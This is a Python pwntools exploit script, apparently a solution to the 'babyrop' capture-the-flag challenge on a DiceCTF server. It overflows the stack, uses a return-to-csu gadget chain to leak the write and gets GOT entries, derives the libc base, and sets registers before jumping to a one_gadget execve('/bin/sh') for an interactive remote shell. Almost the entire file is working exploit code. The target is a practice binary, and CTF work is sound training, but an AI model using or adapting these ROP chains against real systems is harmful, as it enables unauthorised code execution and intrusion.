#! /usr/bin/python
# vim: foldmethod=marker

from pwn import *

elf = ELF('./babyrop')


def set_edi_rsi_rdx_deref_call(edi, rsi, rdx, addr):
    # this is a bit of a crazy gadget based on the return-to-csu / uROP paper
    # https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf

    # the two offsets below are taken from the pwnable binary
    gadget1_offset = 0x4011ca
    gadget2_offset = 0x4011b0

    # jump to the 1st gadget
    payload1 = p64(gadget1_offset)
    # pop rbx, rbp, r12, r13, r14, r15
    payload1 += p64(0)  # rbx
    payload1 += p64(1)  # rbp must be rbx + 1
    payload1 += p64(edi)  # r12; r12d copied to edi in gadget 2
    payload1 += p64(rsi)  # r13 copied to rsi in gadget2
    payload1 += p64(rdx)  # r14 copied to rdx in gadget2
    payload1 += p64(addr)  # r15 + rbx * 8 must be the address which gets dereferenced and called

    # jump to the 2nd gadget
    payload2 = p64(gadget2_offset)
    # add rsp, 8
    payload2 += b'a' * 8
    # pop rbx, rbp, r12, r13, r14, r15
    payload2 += p64(0) * 6

    return payload1 + payload2


def set_rsi(rop, base, val):
    g = rop.find_gadget(['pop rsi', 'ret'])
    return p64(base + g.address) + p64(val)


def rop_nop(rop, base):
    g = rop.find_gadget(['ret'])
    return p64(base + g.address)


def set_rbp(rop, base, val):
    g = rop.find_gadget(['pop rbp', 'ret'])
    return p64(base + g.address) + p64(val)


def set_rdx(base, val):
    chain = b''
    # set rax = val + 1
    # 0x000000000004a550 : pop rax ; ret
    chain += p64(base + 0x000000000004a550) + p64(val + 1)
    # set r8 = rax = val + 1
    # 0x0000000000156298 : mov r8, rax ; mov rax, r8 ; pop rbx ; ret
    chain += p64(base + 0x0000000000156298) + p64(0)
    # set rdx = -1
    # 0x000000000013f9d7 : mov rdx, -1 ; ret
    chain += p64(base + 0x000000000013f9d7)
    # set rdx = rdx + r8 = -1 + val + 1 = val
    # 0x0000000000059c71 : add rdx, r8 ; mov rax, rdx ; pop rbx ; ret
    chain += p64(base + 0x0000000000059c71) + p64(0)

    return chain


# 1. get required padding length {{{

#io = process('./babyrop')
#gdb.attach(io.pid, gdbscript="b *0x40116b")
#payload = cyclic(1000)
#io.clean()
#io.sendline(payload)
#io.interactive()

## }}}

# 2. leak write from got {{{

#io = process('./babyrop.patched')
#gdb.attach(io.pid, gdbscript="b *0x40116b")
io = remote('dicec.tf', 31924)

# found from the previous step
# in gdb run x/1wx $rsp and get 0x61616173
padding_length = cyclic_find(0x61616173)

payload = b'a' * padding_length
payload += set_edi_rsi_rdx_deref_call(1, elf.got['write'], 8, elf.got['write'])
payload += p64(elf.symbols['main'])

io.sendline(payload)
io.readuntil('Your name: ')
write_got = int.from_bytes(io.read(8), 'little')
io.clean()

payload = b'a' * padding_length
payload += set_edi_rsi_rdx_deref_call(1, elf.got['gets'], 8, elf.got['write'])
payload += p64(elf.symbols['main'])

io.sendline(payload)
gets_got = int.from_bytes(io.read(8), 'little')
io.clean()

print('write', hex(write_got))
print('gets', hex(gets_got))

# }}}

# 3. prepare and run one gadget {{{

# use https://github.com/niklasb/libc-database
# ./find write 1d0 gets af0
# ubuntu-glibc (libc6_2.31-0ubuntu9.2_amd64)

# use https://github.com/david942j/one_gadget
# one_gadget libc6_2.31-0ubuntu9.2_amd64.so
# 0xe6e73 execve("/bin/sh", r10, r12)
# constraints:
#   [r10] == NULL || r10 == NULL
#   [r12] == NULL || r12 == NULL
#
# 0xe6e76 execve("/bin/sh", r10, rdx)
# constraints:
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL
#
# 0xe6e79 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

libc_elf = ELF('./libc6_2.31-0ubuntu9.2_amd64.so')
libc_rop = ROP(libc_elf)

libc_base = write_got - 0x1111d0
one_gadget_addr = libc_base + 0xe6e79

print(hex(libc_base))

payload = b'a' * padding_length
payload += set_rdx(libc_base, 0)
payload += set_rsi(libc_rop, libc_base, 0)
payload += set_rbp(libc_rop, libc_base, 0x0000000000404000 + 0x78)
payload += p64(one_gadget_addr)
io.sendline(payload)

io.interactive()

# }}}
